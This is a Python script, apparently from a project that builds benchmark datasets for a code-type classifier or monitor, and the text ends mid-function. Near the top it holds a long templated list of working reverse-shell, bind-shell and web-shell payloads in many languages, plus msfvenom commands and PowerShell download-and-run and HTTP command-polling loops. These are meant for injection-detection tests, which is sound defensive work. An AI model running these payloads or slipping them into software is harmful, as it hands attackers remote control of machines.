#!/usr/bin/env python3
"""Build curated evaluation datasets from the monitor set.

This script samples fragments and documents from the downloader-produced
monitor split (plus Gemini segmentations) and derives a set of benchmark
tasks covering:

- Pure single-label fragments (baseline accuracy by content type).
- Needle-in-the-haystack injections with multiple size buckets.
- Back-to-back multi-label sequences (pairs and triplets).
- Markdown-flavoured mixtures with optional prose/context blocks.
- Throughput stress datasets targeting fixed byte budgets.
"""

from __future__ import annotations

import argparse
import hashlib
import json
import random
import shutil
import string
import sys
import time
from dataclasses import dataclass
from pathlib import Path
from typing import Any, Dict, Iterable, List, Optional, Sequence, Set, Tuple

import datasets as hfds
import numpy as np
from datasets import Dataset, Features, Value
from datasets import Sequence as SeqFeature
from tqdm.auto import tqdm

REPO_ROOT = Path(__file__).resolve().parents[1]
if str(REPO_ROOT) not in sys.path:
    sys.path.insert(0, str(REPO_ROOT))

TRAIN_ROOT = REPO_ROOT / "train"
if str(TRAIN_ROOT) not in sys.path:
    sys.path.insert(0, str(TRAIN_ROOT))

import utils.config as cfg  # noqa: E402
from utils.monitor_eval import load_monitor_memmaps  # noqa: E402

malicious_injections_to_discover = { 
  "shell": [
    """{shell} -i >& /dev/tcp/{ip}/{port} 0>&1""",
    """0<&196;exec 196<>/dev/tcp/{ip}/{port}; {shell} <&196 >&196 2>&196""",
    """exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done""",
    """{shell} -i 5<> /dev/tcp/{ip}/{port} 0<&5 1>&5 2>&5""",
    """{shell} -i >& /dev/udp/{ip}/{port} 0>&1""",
    """rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|nc {ip} {port} >/tmp/f""",
    """nc {ip} {port} -e {shell}""",
    """nc.exe {ip} {port} -e {shell}""",
    """busybox nc {ip} {port} -e {shell}""",
    """nc -c {shell} {ip} {port}""",
    """ncat {ip} {port} -e {shell}""",
    """ncat.exe {ip} {port} -e {shell}""",
    """rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|ncat -u {ip} {port} >/tmp/f""",
    """C='curl -Ns telnet://{ip}:{port}'; $C </dev/null 2>&1 | {shell} 2>&1 | $C >/dev/null""",
    """rcat connect -s {shell} {ip} {port}""",
    """mkfifo /tmp/s; {shell} -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {ip}:{port} > /tmp/s; rm /tmp/s""",
    """socat TCP:{ip}:{port} EXEC:{shell}""",
    """socat TCP:{ip}:{port} EXEC:'{shell}',pty,stderr,setsid,sigint,sane""",
    """sqlite3 /dev/null '.shell rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|nc {ip} {port} >/tmp/f'""",
    """TF=$(mktemp -u);mkfifo $TF && telnet {ip} {port} 0<$TF | {shell} 1>$TF""",
    """zsh -c 'zmodload zsh/net/tcp && ztcp {ip} {port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'""",
    """@echo off&cmd /V:ON /C "SET ip={ip}:{port}&&SET sid="Authorization: eb6a44aa-8acc1e56-629ea455"&&SET protocol=http://&&curl !protocol!!ip!/eb6a44aa -H !sid! > NUL && for /L %i in (0) do (curl -s !protocol!!ip!/8acc1e56 -H !sid! > !temp!\\cmd.bat & type !temp!\\cmd.bat | findstr None > NUL & if errorlevel 1 ((!temp!\\cmd.bat > !tmp!\\out.txt 2>&1) & curl !protocol!!ip!/629ea455 -X POST -H !sid! --data-binary @!temp!\\out.txt > NUL)) & timeout 1" > NUL""",
    """@echo off&cmd /V:ON /C "SET ip={ip}:{port}&&SET sid="Authorization: eb6a44aa-8acc1e56-629ea455"&&SET protocol=https://&&curl -fs -k !protocol!!ip!/eb6a44aa -H !sid! > NUL & for /L %i in (0) do (curl -fs -k !protocol!!ip!/8acc1e56 -H !sid! > !temp!\\cmd.bat & type !temp!\\cmd.bat | findstr None > NUL & if errorlevel 1 ((!temp!\\cmd.bat > !tmp!\\out.txt 2>&1) & curl -fs -k !protocol!!ip!/629ea455 -X POST -H !sid! --data-binary @!temp!\\out.txt > NUL)) & timeout 1" > NUL""",
    """msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f exe -o reverse.exe""",
    """msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -f exe -o reverse.exe""",
    """msfvenom -p windows/x64/shell/reverse_tcp LHOST={ip} LPORT={port} -f exe -o reverse.exe""",
    """msfvenom -p windows/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f exe -o reverse.exe""",
    """msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f jsp -o ./rev.jsp""",
    """msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f aspx -o reverse.aspx""",
    """msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f aspx -o reverse.aspx""",
    """msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f elf -o reverse.elf""",
    """msfvenom -p linux/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f elf -o reverse.elf""",
    """msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b '\x00' -f python -v notBuf -o shellcode""",
    """msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f macho -o shell.macho""",
    """msfvenom -p osx/x64/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -f macho -o shell.macho""",
    """msfvenom -p osx/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f macho -o shell.macho""",
    """msfvenom -p php/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -f raw -o shell.php""",
    """msfvenom -p php/reverse_php LHOST={ip} LPORT={port} -o shell.php""",
    """msfvenom -p java/jsp_shell_reverse_tcp LHOST={ip} LPORT={port} -f raw -o shell.jsp""",
    """msfvenom -p java/shell_reverse_tcp LHOST={ip} LPORT={port} -f war -o shell.war""",
    """msfvenom --platform android -p android/meterpreter/reverse_tcp lhost={ip} lport={port} R -o malicious.apk""",
    """msfvenom --platform android -x template-app.apk -p android/meterpreter/reverse_tcp lhost={ip} lport={port} -o payload.apk""",
    """msfvenom --platform apple_ios -p apple_ios/aarch64/meterpreter_reverse_tcp lhost={ip} lport={port} -f macho -o payload""",
    """msfvenom -p cmd/unix/reverse_python LHOST={ip} LPORT={port} -f raw""",
    """msfvenom -p cmd/unix/reverse_bash LHOST={ip} LPORT={port} -f raw -o shell.sh""",
    """rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | {shell} -i 2>&1 | nc {ip} {port} >/tmp/f""",
    """perl -e 'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("{shell} -i");};'""",
    """perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{ip}:{port}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>'""",
    """perl -e 'use Socket;$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);close C){open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/sh -i");};'""",
    """lua -e "require('socket');require('os');t=socket.tcp();t:connect('{ip}','{port}');os.execute('{shell} -i <&3 >&3 2>&3');\"""",
    """lua5.1 -e 'local host, port = "{ip}", {port} local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()' """,
    """echo 'import os' > /tmp/t.v && echo 'fn main() { os.system("nc -e {shell} {ip} {port} 0>&1") }' >> /tmp/t.v && v run /tmp/t.v && rm /tmp/t.v""",
    """awk 'BEGIN {s = "/inet/tcp/0/{ip}/{port}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null"""
  ],

  "python": [
    """export RHOST="{ip}";export RPORT={port};python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("{shell}")'""",
    """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("{shell}")'""",
    """export RHOST="{ip}";export RPORT={port};python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("{shell}")'""",
    """python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("{shell}")'""",
    """python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("{ip}",{port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("{shell}")'""",
    """python3 -c 'exec(\"\"\"import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind((\"0.0.0.0\",{port}));s1.listen(1);c,a=s1.accept();
while True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())\"\"\")'"""
  ],

  "php": [
    """<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>""",
    """<?=`$_GET[0]`?>""",
    """php -r '$sock=fsockopen("{ip}",{port});exec("{shell} <&3 >&3 2>&3");'""",
    """php -r '$sock=fsockopen("{ip}",{port});shell_exec("{shell} <&3 >&3 2>&3");'""",
    """php -r '$sock=fsockopen("{ip}",{port});system("{shell} <&3 >&3 2>&3");'""",
    """php -r '$sock=fsockopen("{ip}",{port});passthru("{shell} <&3 >&3 2>&3");'""",
    """php -r '$sock=fsockopen("{ip}",{port});`{shell} <&3 >&3 2>&3`;'""",
    """php -r '$sock=fsockopen("{ip}",{port});popen("{shell} <&3 >&3 2>&3", "r");'""",
    """php -r '$sock=fsockopen("{ip}",{port});$proc=proc_open("{shell}", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'""",
    """php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"0.0.0.0",{port});\socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,"$ ",2))exit;\$in=socket_read($cl,100);$cmd=popen("$in","r");while(!feof($cmd)){$m=fgetc($cmd);socket_write($cl,$m,strlen($m));}}'"""
  ],

  "powershell": [
    """IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell {ip} {port}""",
    """$LHOST = "{ip}"; $LPORT = {port}; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()""",
    """powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"""",
    """powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('{ip}', {port});$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()\"""",
    """$sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12; $TCPClient = New-Object Net.Sockets.TCPClient('{ip}', {port});$NetworkStream = $TCPClient.GetStream();$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]));$SslStream.AuthenticateAsClient('cloudflare-dns.com',$null,$sslProtocols,$false);if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {$SslStream.Close();exit}$StreamWriter = New-Object IO.StreamWriter($SslStream);function WriteToStream ($String) {[byte[]]$script:Buffer = New-Object System.Byte[] 4096 ;$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()};WriteToStream '';while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()""",
    """PowerShell #3 (Base64)""",
    """$s='{ip}:{port}';$i='14f30f27-650c00d7-fef40df7';$p='http://';$v=IRM -UseBasicParsing -Uri $p$s/14f30f27 -Headers @{"Authorization"=$i};while ($true){$c=(IRM -UseBasicParsing -Uri $p$s/650c00d7 -Headers @{"Authorization"=$i});if ($c -ne 'None') {$r=IEX $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=IRM -Uri $p$s/fef40df7 -Method POST -Headers @{"Authorization"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}""",
    """add-type @"\nusing System.Net;using System.Security.Cryptography.X509Certificates;\npublic class TrustAllCertsPolicy : ICertificatePolicy {public bool CheckValidationResult(\nServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}\n"@\n[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy\n$s='{ip}:{port}';$i='1cdbb583-f96894ff-f99b8edc';$p='https://';$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/1cdbb583 -Headers @{"Authorization"=$i};while ($true){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/f96894ff -Headers @{"Authorization"=$i});if ($c -ne 'None') {$r=iex $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-RestMethod -Uri $p$s/f99b8edc -Method POST -Headers @{"Authorization"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}"""
  ],

  "javascript_typescript": [
    """require('child_process').exec('nc -e {shell} {ip} {port}')""",
    """(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("{shell}", []);
    var client = new net.Socket();
    client.connect({port}, "{ip}", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application from crashing
})();"""
  ],

  "java": [
    """String host="{ip}";int port={port};String cmd="{shell}";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();""",
    """public class shell {
    public static void main(String[] args) {
        Process p;
        try {
            p = Runtime.getRuntime().exec("bash -c $@|bash 0 echo bash -i >& /dev/tcp/{ip}/{port} 0>&1");
            p.waitFor();
            p.destroy();
        } catch (Exception e) {}
    }
}""",
    """public class shell {
    public static void main(String[] args) {
        ProcessBuilder pb = new ProcessBuilder("bash", "-c", "$@| bash -i >& /dev/tcp/{ip}/{port} 0>&1")
            .redirectErrorStream(true);
        try {
            Process p = pb.start();
            p.waitFor();
            p.destroy();
        } catch (Exception e) {}
    }
}"""
  ],

  "go": [
    """echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","{ip}:{port}");cmd:=exec.Command("{shell}");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"""
  ],

  "ruby": [
    """ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("{ip}",{port}))'""",
    """ruby -rsocket -e'exit if fork;c=TCPSocket.new("{ip}","{port}");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}" }'"""
  ],

  "csharp": [
    """using System;
using System.Diagnostics;

namespace BackConnect {
  class ReverseBash {
    public static void Main(string[] args) {
      Process proc = new System.Diagnostics.Process();
      proc.StartInfo.FileName = "{shell}";
      proc.StartInfo.Arguments = "-c \\"{shell} -i >& /dev/tcp/{ip}/{port} 0>&1\\"";
      proc.StartInfo.UseShellExecute = false;
      proc.StartInfo.RedirectStandardOutput = true;
      proc.Start();

      while (!proc.StandardOutput.EndOfStream) {
        Console.WriteLine(proc.StandardOutput.ReadLine());
      }
    }
  }
}"""
  ],

  "php": [
    """php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"0.0.0.0",{port});\socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,"$ ",2))exit;\$in=socket_read($cl,100);$cmd=popen("$in","r");while(!feof($cmd)){$m=fgetc($cmd);socket_write($cl,$m,strlen($m));}}'"""  # from BindShell section
  ]
}

@dataclass
class Fragment:
    """Represents a single validation fragment available for sampling."""

    lang: str
    content: str
    uid: Optional[str]
    extra_meta: Optional[dict]


@dataclass
class MonitorDoc:
    """Monitor document built from Gemini segmentations or Arrow monitor."""

    declared_lang: str
    content: str
    segments: List[dict]
    uid: Optional[str]
    source: str  # "gemini" or "monitor_arrow"
    extra_meta: Optional[dict]

NON_ASCII_PLACEHOLDER = "\u00A4"
_VISIBLE_ASCII_MIN = 0x20
_VISIBLE_ASCII_MAX = 0x7E
_ALLOWED_TEXT_CONTROLS = {"\n", "\t"}

_MAX_NEEDLE_COMMENT_RATIO = 0.4
_PAYLOAD_MAX_VISIBLE = 1000
_PAYLOAD_SHELL_CHOICES = ["/bin/bash", "/bin/sh", "/usr/bin/env python3", "/bin/zsh", "powershell", "cmd.exe"]
_PROHIBITED_INJECTION_LANGS = {"csv", "json", "yaml", "text", "html"}
_MARKDOWN_INLINE_CODE_PROB = 0.25


def _visible_char_count(text: str) -> int:
    """Count printable, non-whitespace characters."""
    return sum(1 for ch in text if ch.isprintable() and not ch.isspace())

def _ascii_letter_count(text: str) -> int:
    """Count only ASCII alphabetic characters."""
    return sum(1 for ch in text if ("a" <= ch <= "z") or ("A" <= ch <= "Z"))

def _normalize_text(text: Optional[str]) -> str:
    if not text:
        return ""
    out_chars: List[str] = []
    for ch in text:
        if ch == "\r":
            ch = "\n"
        code = ord(ch)
        if ch in _ALLOWED_TEXT_CONTROLS or _VISIBLE_ASCII_MIN <= code <= _VISIBLE_ASCII_MAX or ch == NON_ASCII_PLACEHOLDER:
            out_chars.append(ch)
        else:
            out_chars.append(NON_ASCII_PLACEHOLDER)
    return "".join(out_chars)


def _log(msg: str) -> None:
    now = time.strftime("%H:%M:%S")
    print(f"[{now}] {msg}", flush=True)


def _canonical_type(raw: str, known: Set[str], top_level_hint: str | None = None) -> str:
    """
    Canonicalize a raw label into the training label space.

    Mirrors downloader/999_prepare_monitor_set._canonical_type so monitor-based
    evaluation uses the same buckets as training/monitor preprocessing.
    """
    key = (raw or "").strip().lower().replace(" ", "_")
    key = key.replace("-", "_").replace(".", "_")
    if not key and top_level_hint:
        key = top_level_hint

    alias_map = {
        "js": "javascript",
        "jsx": "javascript",
        "tsx": "typescript",
        "ts": "typescript",
        "shell_batchfile": "shell",
        "batchfile": "shell",
        "bat": "shell",
        "cmd": "shell",
        "bash": "shell",
        "sh": "shell",
        "zsh": "shell",
        "ps": "powershell",
        "ps1": "powershell",
        "vb": "visual_basic",
        "vbnet": "visual_basic",
        "vb_net": "visual_basic",
        "visualbasic": "visual_basic",
        "c++": "c_family",
        "cpp": "c_family",
        "c-family": "c_family",
        "cfamily": "c_family",
        "c#": "csharp",
        "c-sharp": "csharp",
        "yml": "yaml",
        "htm": "html",
        "md": "markdown",
        "rst": "restructuredtext",
        "plaintext": "text",
        "plain_text": "text",
    }
    key = alias_map.get(key, key)

    if key.startswith("other_") or key.startswith("discovered_"):
        return "other"

    if "template" in key or key.endswith("_config"):
        return "other"

    # Merge close variants into canonical training buckets
    if key in {"javascript", "typescript"}:
        key = "javascript_typescript"
    if key in {"c", "h"}:
        key = "c_family"
    if key == "makefile":
        return "other"
    if key == "batch":
        key = "shell"

    if key not in known:
        if top_level_hint and top_level_hint in known:
            return top_level_hint
        return "other"
    return key


def _load_val_fragments(
    data_root: Path,
    per_lang_target: int,
    *,
    extra_multiplier: int,
    seed: int,
) -> Dict[str, List[Fragment]]:
    """Load and sample validation fragments per language."""

    out: Dict[str, List[Fragment]] = {}
    missing: List[str] = []
    
    langs = sorted(cfg.LANG2ID.keys())
    _log("📂 Loading validation fragments...")
    for lang in tqdm(langs, desc="Loading languages", unit="lang"):
        path = data_root / "val" / lang / "dataset"
        if not path.exists():
            missing.append(lang)
            continue
        try:
            ds = hfds.load_from_disk(str(path))
        except Exception as exc:  # pragma: no cover - informative logging
            _log(f"⚠️  Failed to load validation dataset for '{lang}': {exc}")
            continue

        if len(ds) == 0:
            _log(f"⚠️  Validation dataset for '{lang}' is empty; skipping.")
            continue

        target = min(len(ds), per_lang_target * max(1, extra_multiplier))
        if target <= 0:
            continue

        seed_offset = seed + cfg.LANG2ID.get(lang, 0)
        sampled = ds.shuffle(seed=seed_offset).select(range(target))
        fragments: List[Fragment] = []
        for row in sampled:
            raw_text = row.get("content")
            text = _normalize_text(raw_text if isinstance(raw_text, str) else "")
            if not text:
                continue
            uid = row.get("uid") if isinstance(row, dict) else None
            extra_meta = {
                k: row[k]
                for k in ("source_repo", "source_repo_path", "source_ext", "license")
                if k in row and isinstance(row[k], str)
            }
            fragments.append(Fragment(lang=lang, content=text, uid=uid, extra_meta=extra_meta or None))

        if not fragments:
            _log(f"⚠️  No usable fragments collected for '{lang}'.")
            continue
        out[lang] = fragments

    if missing:
        _log(
            "⚠️  Missing validation splits for: "
            + ", ".join(sorted(missing))
        )
    return out


def _load_monitor_fragments_and_docs(
    data_root: Path,
    per_lang_target: int,
    *,
    extra_multiplier: int,
    seed: int,
    monitor_seg_root: Path,
) -> Tuple[Dict[str, List[Fragment]], List[MonitorDoc]]:
    """Load monitor data (Gemini segmentations + Arrow monitor) for evaluation.

    Fragments are used for synthetic-style tasks (pure, mal_injection,
    sequence_pair/triplet, throughput). MonitorDoc objects keep full mixed-type
    documents for monitor-based tasks (needles, markdown).
    """

    cfg.update_lang_mappings()
    known_labels: Set[str] = set(cfg.LANG2ID.keys())
    rng = random.Random(seed)

    fragments_by_lang: Dict[str, List[Fragment]] = {}
    monitor_docs: List[MonitorDoc] = []

    # ------------------------------------------------------------------
    # 1) Gemini monitor segmentations
    # ------------------------------------------------------------------
    if monitor_seg_root.exists():
        _log(f"📥 Loading Gemini monitor segmentations from {monitor_seg_root} ...")
        for type_dir in sorted(monitor_seg_root.iterdir()):
            if not type_dir.is_dir():
                continue
            declared_raw = type_dir.name
            declared_lang = _canonical_type(declared_raw, known_labels)
            for path in sorted(type_dir.glob("*.json")):
                try:
                    with open(path, "r", encoding="utf-8") as f:
                        data = json.load(f)
                except Exception as exc:
                    _log(f"⚠️  Skipping unreadable segmentation {path}: {exc}")
                    continue

                segs = data.get("segments") or []
                if not segs:
                    continue

                meta = data.get("metadata") or {}
                purity = meta.get("purity_check") or {}
                classification = meta.get("classification") or {}
                uid = (
                    purity.get("input_sha256")
                    or classification.get("input_sha256")
                    or path.stem
                )

                content_parts: List[str] = []
                doc_segments: List[dict] = []
                cursor = 0
                for seg in segs:
                    text = seg.get("content") or ""
                    text = _clean_snippet_text(text)
                    if not text:
                        continue
                    raw_type = seg.get("type") or declared_raw
                    seg_lang = _canonical_type(raw_type, known_labels, top_level_hint=declared_lang)
                    start = cursor
                    end = start + len(text)
                    cursor = end
                    doc_segments.append(
                        {
                            "label": seg_lang,
                            "char_start": start,
                            "char_end": end,
                        }
                    )
                    content_parts.append(text)

                    frag_meta: Dict[str, Any] = {
                        "monitor_source": "gemini",
                        "declared_type": declared_raw,
                        "file_path": str(path),
                    }
                    fragments_by_lang.setdefault(seg_lang, []).append(
                        Fragment(lang=seg_lang, content=text, uid=uid, extra_meta=frag_meta)
                    )

                if not content_parts or not doc_segments:
                    continue

                doc_content = "".join(content_parts)
                monitor_docs.append(
                    MonitorDoc(
                        declared_lang=declared_lang,
                        content=doc_content,
                        segments=doc_segments,
                        uid=uid,
                        source="gemini",
                        extra_meta=meta or None,
                    )
                )
    else:
        _log(f"⚠️  Gemini monitor segmentations not found at {monitor_seg_root}; skipping.")

    # ------------------------------------------------------------------
    # 2) Arrow monitor datasets (pure files, per type)
    # ------------------------------------------------------------------
    arrow_monitor_root = data_root / "monitor"
    if arrow_monitor_root.exists():
        _log(f"📥 Loading Arrow monitor datasets from {arrow_monitor_root} ...")
        for type_dir in sorted(arrow_monitor_root.iterdir()):
            if not type_dir.is_dir():
                continue
            declared_raw = type_dir.name
            declared_lang = _canonical_type(declared_raw, known_labels)

            ds_path = type_dir / "dataset"
            if not ds_path.exists():
                continue
            try:
                ds = hfds.load_from_disk(str(ds_path))
            except Exception as exc:
                _log(f"⚠️  Failed to load monitor dataset for '{declared_raw}': {exc}")
                continue
            if len(ds) == 0:
                continue

            for row in ds:
                raw_text = row.get("content")
                text = _clean_snippet_text(raw_text if isinstance(raw_text, str) else "")
                if not text:
                    continue
                uid = row.get("uid") if isinstance(row, dict) else None
                extra_meta = {
                    k: row[k]
                    for k in ("source_repo", "source_repo_path", "source_ext", "license")
                    if k in row and isinstance(row[k], str)
                }
                frag_extra = {"monitor_source": "monitor_arrow"}
                if extra_meta:
                    frag_extra.update(extra_meta)
                fragments_by_lang.setdefault(declared_lang, []).append(
                    Fragment(
                        lang=declared_lang,
                        content=text,
                        uid=uid,
                        extra_meta=frag_extra,
                    )
                )
                doc_segments = [
                    {
                        "label": declared_lang,
                        "char_start": 0,
                        "char_end": len(text),
                    }
                ]
                monitor_docs.append(
                    MonitorDoc(
                        declared_lang=declared_lang,
                        content=text,
                        segments=doc_segments,
                        uid=uid,
                        source="monitor_arrow",
                        extra_meta=extra_meta or None,
                    )
                )
    else:
        _log(f"⚠️  Arrow monitor root not found at {arrow_monitor_root}; skipping.")

    # ------------------------------------------------------------------
    # 3) Down-sample fragment pools per language for synthetic tasks
    # ------------------------------------------------------------------
    target_per_lang = per_lang_target * max(1, int(extra_multiplier))
    if target_per_lang > 0:
        for lang, frags in list(fragments_by_lang.items()):
            if not frags:
                continue
            if len(frags) <= target_per_lang:
                continue
            rng.shuffle(frags)
            fragments_by_lang[lang] = frags[:target_per_lang]

    # Drop empty languages to keep downstream loops tidy
    fragments_by_lang = {lang: frags for lang, frags in fragments_by_lang.items() if frags}

    if not fragments_by_lang and not monitor_docs:
        _log("⚠️  No monitor fragments or documents collected.")

    return fragments_by_lang, monitor_docs


def _load_monitor_fragments_and_docs_from_memmap(
    monitor_root: Path,
    per_lang_target: int,
    *,
    extra_multiplier: int,
    seed: int,
) -> Tuple[Dict[str, List[Fragment]], List[MonitorDoc]]:
    """
    Build fragments/docs directly from a preprocessed monitor memmap
    (e.g., downloader/monitor_preprocessed_b). This is used for fine-tuned
    evaluation so that all monitor-derived evaluation examples come strictly
    from the held-out subset.
    """
    cfg.update_lang_mappings()
    rng = random.Random(seed)

    if not monitor_root.exists():
        raise FileNotFoundError(f"Monitor memmap root not found at {monitor_root}")

    data = load_monitor_memmaps(monitor_root)
    meta = data.get("meta") or {}
    files = data["files"]
    segments = data["segments"]
    contents = data["contents"]

    id2lang = dict(cfg.ID2LANG)
    fragments_by_lang: Dict[str, List[Fragment]] = {}
    monitor_docs: List[MonitorDoc] = []

